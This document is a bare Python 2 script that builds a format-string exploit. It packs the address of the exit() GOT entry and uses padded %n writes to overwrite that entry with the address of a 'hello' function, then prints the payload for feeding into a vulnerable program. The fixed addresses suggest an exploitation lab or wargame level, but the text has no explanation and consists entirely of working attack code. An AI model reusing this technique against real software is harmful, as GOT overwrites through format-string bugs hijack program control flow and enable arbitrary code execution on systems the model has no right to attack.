import struct
EXIT_GOT=0x8049724
#HELLO_ADDR=0x80484b4
exploit=""
exploit+=struct.pack("I", EXIT_GOT)
exploit+=struct.pack("I", EXIT_GOT+2)
exploit+="%4$33964x"
exploit+="%4$n"
exploit+="%4$33616x"
exploit+="%5$n"
print exploit